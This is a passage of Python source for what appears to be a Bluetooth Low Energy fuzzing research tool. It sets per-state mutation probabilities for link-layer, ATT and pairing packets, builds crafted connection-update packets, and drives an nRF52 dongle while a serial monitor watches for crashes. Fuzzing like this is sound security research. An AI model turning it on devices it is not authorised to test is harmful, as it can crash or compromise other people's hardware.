# Commom imports
import binascii
import time
import socket
import os
import time
import sys
import serial
from stat import *
import logging
import subprocess
from binascii import hexlify
import threading
import os
import sys
import inspect
import json
import logging
import traceback
from time import sleep, time
from serial import SerialException
import time
# PyCryptodome imports
from Crypto.Cipher import AES
from thread import *
import threading
# Flask imports
from flask import Flask, request
from flask_socketio import SocketIO
# Scapy imports
from scapy.layers.bluetooth import HCI_Hdr, L2CAP_Connection_Parameter_Update_Request, _att_error_codes
from scapy.layers.bluetooth4LE import *
from scapy.layers.bluetooth import *
from scapy.utils import wrpcap, raw
from scapy.packet import Raw

# BTLE Suite
from blesuite.pybt.att import AttributeProtocol
from blesuite.pybt.sm import SM, SecurityManagerProtocol
from blesuite.pybt.gatt import Server, UUID
from blesuite.entities.gatt_device import BLEDevice
import blesuite.utils.att_utils as att_utils
import blesuite.pybt.roles as ble_roles
import blesuite.pybt.gatt as PyBTGATT

# Colorama
from colorama import Fore, Back, Style
from colorama import init as colorama_init

# Project imports
from greyhound.machine import GreyhoundStateMachine
from greyhound import fitness
from greyhound import fuzzing
from greyhound.fuzzing import StateConfig, MutatorRandom, SelectorRandom, SelectorAll
from greyhound.webserver import send_vulnerability, send_fitness, SetFuzzerConfig
from drivers.NRF52_dongle import NRF52Dongle
import BLESMPServer
from monitors.monitor_serial import Monitor

from parse_cmd2 import parse_cmd

print_lock = threading.Lock()
device = None
acl_frag_flag = None
saved_ATT_Hdr = None
saved_pkt_with_ATT_Hdr = None
command = None
states = [
    {'name': 'SCANNING'},  # , 'on_enter': 'send_scan_request', 'timeout': 0.5, 'on_timeout': 'retry'},
]

transitions = [
    # SCANNING -> CONNECTING

    {'trigger': 'update', 'source': 'SCANNING', 'dest': 'SCANNING'},
]


scan_response_received = False
states_fuzzer_config = {
    'SCANNING': StateConfig(
        states_expected=[BTLE_DATA, BTLE_ADV_IND, BTLE_ADV_DIRECT_IND, BTLE_ADV_NONCONN_IND, BTLE_ADV_SCAN_IND,
                         BTLE_SCAN_RSP, BTLE_SCAN_REQ, BTLE_CONNECT_REQ],
        # Layers to be fuzzed before sending messages in a specific state (CVEs)
        fuzzable_layers=[BTLE_SCAN_REQ, BTLE_ADV],
        # What layers the fuzzing is applied (fuzzable layers)
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=10,  # 50  # 20  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],  # Probability for "len" fields to be fuzzed
        fuzzable_action_transition=None),
    'INITIATING': StateConfig(
        states_expected=[BTLE_ADV_IND, BTLE_ADV_DIRECT_IND, BTLE_ADV_NONCONN_IND, BTLE_ADV_SCAN_IND,
                         BTLE_SCAN_REQ, BTLE_CONNECT_REQ, BTLE_DATA, BTLE_SCAN_RSP],
        fuzzable_layers=[BTLE_ADV],
        fuzzable_layers_mutators=[[MutatorRandom]],  # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom],  # Selection strategy
        fuzzable_layers_mutators_global_chance=10,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[100],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None]],
        fuzzable_layers_mutators_lengths_chance=[5],
        fuzzable_action_transition=None),
    'GATT_SERVER': StateConfig(
        states_expected=[ATT_Hdr, L2CAP_Connection_Parameter_Update_Request, SM_Pairing_Response],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, ATT_Read_By_Type_Response, ATT_Read_Response, ATT_Error_Response,
                         LL_ENC_RSP],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5, 5, 5],
        fuzzable_action_transition=None),
    'FEATURE_REQ': StateConfig(
        states_expected=[SM_Security_Request, ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, LL_VERSION_IND,
                         L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP, SM_Pairing_Response, LL_LENGTH_REQ,
                         LL_LENGTH_RSP],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_FEATURE_REQ],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5],
        fuzzable_action_transition=None),
    'FEATURE_RSP': StateConfig(
        states_expected=[ATT_Hdr, LL_LENGTH_REQ, LL_UNKNOWN_RSP, L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP,
                         SM_Pairing_Response],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_FEATURE_RSP],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5],
        fuzzable_action_transition=None),
    'LENGTH_REQ': StateConfig(
        states_expected=[LL_REJECT_IND, LL_LENGTH_REQ, ATT_Hdr, LL_UNKNOWN_RSP, LL_FEATURE_RSP, LL_UNKNOWN_RSP,
                         LL_LENGTH_RSP,
                         SM_Pairing_Response, L2CAP_Connection_Parameter_Update_Request, LL_VERSION_IND, LL_ENC_RSP],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_LENGTH_REQ],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5],
        fuzzable_action_transition=None),

    'LENGTH_RSP': StateConfig(
        states_expected=[ATT_Hdr, LL_SLAVE_FEATURE_REQ, L2CAP_Connection_Parameter_Update_Request, SM_Security_Request,
                         LL_REJECT_IND, LL_VERSION_IND, LL_LENGTH_RSP, LL_UNKNOWN_RSP, LL_REJECT_IND, LL_ENC_RSP,
                         SM_Pairing_Response],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_LENGTH_RSP, L2CAP_Connection_Parameter_Update_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[10, 5, 5],
        fuzzable_action_transition=None),
    'VERSION_REQ': StateConfig(
        states_expected=[ATT_Read_By_Group_Type_Response, LL_REJECT_IND, ATT_Hdr, LL_VERSION_IND, LL_UNKNOWN_RSP,
                         LL_FEATURE_RSP,
                         L2CAP_Connection_Parameter_Update_Request, SM_Security_Request, LL_LENGTH_RSP, LL_LENGTH_REQ,
                         SM_Pairing_Response, LL_ENC_RSP],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_VERSION_IND],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[10, 10, 10],
        fuzzable_action_transition=None),
    'VERSION_RSP': StateConfig(
        states_expected=[ATT_Exchange_MTU_Response, ATT_Read_By_Group_Type_Request, ATT_Read_By_Group_Type_Response,
                         LL_REJECT_IND, LL_VERSION_IND,
                         LL_SLAVE_FEATURE_REQ,
                         L2CAP_Connection_Parameter_Update_Request,
                         LL_ENC_RSP],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_VERSION_IND],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5],
        fuzzable_action_transition=None),
    'MTU_LEN_RSP': StateConfig(
        states_expected=[ATT_Hdr, L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Exchange_MTU_Response, LL_UNKNOWN_RSP],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'MTU_LEN_REQ': StateConfig(
        states_expected=[ATT_Exchange_MTU_Response, LL_SLAVE_FEATURE_REQ, SM_Security_Request, ATT_Error_Response,
                         LL_REJECT_IND, LL_FEATURE_RSP, LL_LENGTH_RSP, LL_UNKNOWN_RSP, SM_Pairing_Response,
                         LL_VERSION_IND, ATT_Hdr, LL_LENGTH_REQ, L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Exchange_MTU_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'PRI_SERVICES': StateConfig(
        states_expected=[LL_REJECT_IND, ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, LL_VERSION_IND, LL_LENGTH_RSP, SM_Hdr,
                         L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Read_By_Group_Type_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[25, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'SEC_SERVICES': StateConfig(
        states_expected=[ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, SM_Security_Request, LL_REJECT_IND, LL_LENGTH_RSP,
                         SM_Hdr, L2CAP_Connection_Parameter_Update_Request],
        fuzzable_layers=[ATT_Hdr, ATT_Read_By_Group_Type_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[25, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'CHARACTERISTICS': StateConfig(
        states_expected=[ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, LL_REJECT_IND, LL_LENGTH_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Read_By_Type_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[25, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[25, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'INCLUDES': StateConfig(
        states_expected=[ATT_Hdr, LL_FEATURE_RSP, LL_REJECT_IND, LL_UNKNOWN_RSP, LL_LENGTH_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Find_Information_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[25, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[25, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'DESCRIPTORS': StateConfig(
        states_expected=[ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, LL_REJECT_IND, LL_LENGTH_RSP],
        fuzzable_layers=[ATT_Hdr, ATT_Read_By_Type_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'READ': StateConfig(
        states_expected=[ATT_Hdr, LL_UNKNOWN_RSP, LL_FEATURE_RSP, LL_REJECT_IND],
        fuzzable_layers=[ATT_Hdr, ATT_Read_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5],
        fuzzable_action_transition=None),
    'WRITE': StateConfig(
        states_expected=[ATT_Hdr, LL_UNKNOWN_RSP, LL_FEATURE_RSP, LL_REJECT_IND],
        fuzzable_layers=[ATT_Hdr, ATT_Write_Request],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[25, 25],
        fuzzable_action_transition=None),
    'DISCONNECT': StateConfig(
        states_expected=[ATT_Hdr, LL_UNKNOWN_RSP, ATT_Error_Response, LL_FEATURE_RSP, BTLE_DATA],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None]],
        fuzzable_layers_mutators_lengths_chance=[0, 0],
        fuzzable_action_transition=None),
    'PAIR_REQUEST': StateConfig(
        states_expected=[LL_LENGTH_REQ, SM_Hdr, ATT_Hdr, LL_FEATURE_RSP, LL_UNKNOWN_RSP, LL_REJECT_IND, LL_LENGTH_RSP,
                         L2CAP_Connection_Parameter_Update_Request, LL_ENC_RSP],
        fuzzable_layers=[BTLE_DATA, SM_Hdr, SM_Pairing_Request, SM_Random, SM_Confirm, SM_Public_Key],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom],
                                  [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom,
                                    SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=30,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[30, 30, 30, 30, 30, 30],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[30, 30, 30, 30, 30, 30],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None], [None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[10, 10, 10, 10, 10, 10],
        fuzzable_action_transition=None),
    'ENCRYPTION': StateConfig(
        states_expected=[SM_Failed, L2CAP_Connection_Parameter_Update_Request, SM_DHKey_Check, SM_Random, LL_ENC_RSP,
                         LL_START_ENC_REQ, LL_START_ENC_RSP,
                         ATT_Exchange_MTU_Response, LL_REJECT_IND,
                         LL_UNKNOWN_RSP, LL_FEATURE_RSP, ATT_Exchange_MTU_Request],
        fuzzable_layers=[BTLE_DATA, LL_ENC_REQ, LL_START_ENC_REQ, LL_ENC_RSP],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 25, 25],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 25, 25],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5, 5],
        fuzzable_action_transition=None),
    'KEY_EXCHANGE': StateConfig(
        states_expected=[LL_LENGTH_RSP, SM_Hdr, LL_UNKNOWN_RSP, LL_FEATURE_RSP, ATT_Exchange_MTU_Response,
                         LL_REJECT_IND],
        fuzzable_layers=[BTLE, BTLE_DATA, L2CAP_Hdr, SM_Hdr, SM_Identity_Information, SM_Master_Identification,
                         SM_Identity_Address_Information, SM_Signing_Information],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom], [MutatorRandom],
                                  [MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom, SelectorRandom,
                                    SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=50,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[25, 50, 50, 50, 50, 50, 50, 50],
        # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50, 50, 50, 50, 50, 50],
        # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None], [None], [None], [None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5, 5, 5, 5, 5, 5],
        fuzzable_action_transition=None),
    'SECURITY_RSP': StateConfig(
        states_expected=[BTLE_DATA],
        fuzzable_layers=[BTLE_DATA, ATT_Hdr, LL_VERSION_IND, LL_FEATURE_RSP, LL_LENGTH_RSP],
        fuzzable_layers_mutators=[[MutatorRandom], [MutatorRandom], [MutatorRandom]],
        # Type of mutators applied for each fuzzable layer
        fuzzable_layers_selections=[SelectorRandom, SelectorRandom, SelectorRandom],
        # Selection strategy
        fuzzable_layers_mutators_global_chance=25,  # 10  # Probability for the entire packet to be even fuzzed
        fuzzable_layers_mutators_chance_per_layer=[50, 50, 50],  # Probability for each layer to be fuzzed
        fuzzable_layers_mutators_chance_per_field=[50, 50, 50],  # Probability for each field to be fuzzed
        fuzzable_layers_mutators_exclude_fields=[[None], [None], [None]],
        fuzzable_layers_mutators_lengths_chance=[5, 5, 5],
        fuzzable_action_transition=None),
}

conn_update = BTLE(access_addr=0x9a328370) / BTLE_DATA() / CtrlPDU() / LL_CONNECTION_UPDATE_REQ(win_size=2,
                                                                                                win_offset=2,
                                                                                                interval=46,  # 36 100
                                                                                                latency=0,
                                                                                                timeout=100,
                                                                                                instant=100
                                                                                                )

chm_update = BTLE(access_addr=0x9a328370) / BTLE_DATA() / CtrlPDU() / LL_CHANNEL_MAP_REQ(chM=0x1FF000000E,
                                                                                         instant=100
                                                                                         )


class BLECentralMethods(object):  # type: HierarchicalGraphMachine
    name = 'BLE'
    iterations = 0
    # Default Model paramaters
    master_address = None  # will take these inputs from a git ignored config file 
    slave_address = None    # will take these inputs from socket
    #master_feature_set = 'le_encryption+le_data_len_ext'  # Model dependent
    master_mtu = 247  # TODO: master_mtu
    conn_access_address = 0x5b431498
    conn_interval = 16
    conn_window_offset = 1
    conn_window_size = 2
    conn_channel_map = 0x1DDFFFFFFF
    conn_slave_latency = 0
    conn_timeout = 100
    dongle_serial_port = '/dev/ttyACM0'
    enable_fuzzing = False
    enable_duplication = False
    pairing_pin = '0000'
    scan_timeout = 6  # Time in seconds for detect a crash during scanning
    state_timeout = 3  # state timeout
    #pairing_iocap = 0x01  # DisplayYesNo
    #pairing_iocap = 0x01  # DisplayYesNo
    #pairing_iocap = 0x03  # NoInputNoOutput
    #pairing_iocap = 0x04  # KeyboardDisplay
    #paring_auth_request = 0x00  # No bonding
    #paring_auth_request = 0x01  # Bonding
    #paring_auth_request = 0x08 | 0x01  # Le Secure Connection + bonding
    #paring_auth_request = 0x04 | 0x01  # MITM + bonding
    #paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bonding
    #paring_auth_request = 0xd  # Le Secure Connection + MITM + bonding
    # monitor_serial_port = '/dev/ttyUSB0'      # taking input from ble_config.json file
    monitor_serial_baud = 115200
    monitor_serial_magic_string = 'BLE Host Task Started'
    # -----------------------------------------------------------------------------------
    monitor = None
    # Timers for name reference
    conn_supervision_timer = None  # type: threading.Timer
    conn_general_timer = None  # type: threading.Timer
    scan_timeout_timer = None  # type: threading.Timer
    # Internal instances
    att = None
    smp = None  # type: SM
    driver = None  # type: NRF52Dongle
    # Internal variables
    master_address_raw = None
    slave_address_raw = None
    config_file = '/home/user/Desktop/proteus/BLE-State-Fuzzing/config_files/ble_config.json'
    addr_file = '/home/user/Desktop/proteus/BLE-State-Fuzzing/config_files/addr_config.json'
    iterations = 0
    master_address_type = None

    pkt_received = None
    pkt = None
    peer_address = None
    last_gatt_request = None
    empty_pdu_count = 0
    master_gatt_server = None
    sent_packet = None
    pairing_starting = False
    # Internal Slave params
    slave_address_type = None
    slave_feature_set = None
    slave_ble_version = None
    slave_next_start_handle = None
    slave_next_end_handle = None
    slave_service_idx = None
    slave_characteristic_idx = None
    slave_characteristic = None
    slave_device = None  # type: BLEDevice
    slave_handles = None
    slave_handles_values = None
    slave_handles_idx = None
    slave_ever_connected = False
    slave_connected = False
    slave_crashed = False
    slave_l2cap_fragment = []
    # Internal Encryption params
    conn_ltk = None
    conn_ediv = None
    conn_rand = None
    conn_iv = None
    conn_skd = None
    conn_session_key = None  # Used for LL Encryption
    conn_master_packet_counter = 0  # Packets counter for master (outgoing)
    conn_slave_packet_counter = 0  # Packets counter for slave (incoming)
    conn_encryted = False

    def __init__(self, machine_states, machine_transitions,
                #  master_address=None,
                 master_mtu=None,
                #  slave_address=None,
                 dongle_serial_port=None,
                 baudrate=None,
                 enable_fuzzing=None,
                 enable_duplication=None,
                 monitor_serial_port=None,
                 monitor_serial_baud=None,
                 monitor_magic_string=None,
                 client_socket=None):

        colorama_init(autoreset=True)  # Colors autoreset

        self.load_config()
        self.load_initial_addrs()

        self.client_socket = client_socket

        # Override loaded settings
        # if slave_address is not None:
        #     self.slave_address = slave_address

        # slave_address = self.slave_address

        # if master_address is not None:
        #     self.master_address = master_address

        if dongle_serial_port is not None:
            self.dongle_serial_port = dongle_serial_port

        if enable_fuzzing is not None:
            self.enable_fuzzing = enable_fuzzing

        if enable_duplication is not None:
            self.enable_duplication = enable_duplication

        if monitor_serial_port is not None:
            self.monitor_serial_port = monitor_serial_port

        if monitor_serial_baud is not None:
            self.monitor_serial_baud = monitor_serial_baud

        if monitor_magic_string is not None:
            self.monitor_serial_magic_string = monitor_magic_string

        if master_mtu is not None:
            self.master_mtu = master_mtu

        self.smp = SecurityManagerProtocol(self)
        BLESMPServer.set_pin_code(bytearray([(ord(byte) - 0x30) for byte in self.pairing_pin]))
        # BLESMPServer.set_local_key_distribution(0x07)

        self.master_gatt_server = self.create_gatt_server(mtu=master_mtu)
        self.att = AttributeProtocol(self, self.smp, event_hook=None, gatt_server=self.master_gatt_server,
                                     mtu=master_mtu)
        # self.master_address = master_address
        # self.slave_address = slave_address
        self.dongle_serial_port = dongle_serial_port
        self.baudrate = baudrate
        self.driver = NRF52Dongle(dongle_serial_port, baudrate)

        if self.master_address is not None:
            self.master_address_raw = ''.join(map(lambda x: chr(int(x, 16)), self.master_address.split(':')))
